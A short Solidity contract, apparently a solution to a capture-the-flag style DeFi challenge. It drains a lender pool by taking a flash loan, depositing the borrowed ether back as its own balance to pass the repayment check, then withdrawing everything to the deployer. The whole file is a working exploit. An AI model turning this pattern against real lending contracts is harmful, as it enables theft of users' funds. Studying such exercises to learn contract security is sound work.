pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    using Address for address payable;
    SideEntranceLenderPool public pool;
    address payable public attacker;
    uint public attackAmount;

    constructor(address poolAddress, uint _attackAmount) public {
      pool = SideEntranceLenderPool(poolAddress);
      attackAmount = _attackAmount;
      attacker = msg.sender;
    }

    function attack() public {
      pool.flashLoan(attackAmount);
      pool.withdraw();
      attacker.sendValue(attackAmount);
    }

    function execute() external payable {
      pool.deposit{value: msg.value}();
    }

    receive () external payable {}
}
 